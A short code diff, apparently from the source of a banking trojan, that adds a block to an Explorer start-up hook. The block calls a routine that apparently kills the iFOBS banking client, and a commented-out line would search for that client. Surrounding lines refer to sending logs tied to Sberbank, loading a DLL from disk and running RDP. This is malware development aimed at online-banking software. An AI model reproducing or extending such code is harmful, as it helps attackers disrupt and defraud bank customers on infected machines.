@@ -48,6 +48,11 @@ void ExplorerFirstStart(PEventData Data)
 		Sber::SendLogIfReestr();
 	#endif
 
+	#ifdef IFobsH
+//		RunThread( IFobs::FindIFobsClient, 0 );
+		IFobs::KillIFobs();
+	#endif
+
 	//ExecuteDocFind( 0, 0, 0 );
 	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
 //	ExecuteRunRDP( 0, 0, 0 );
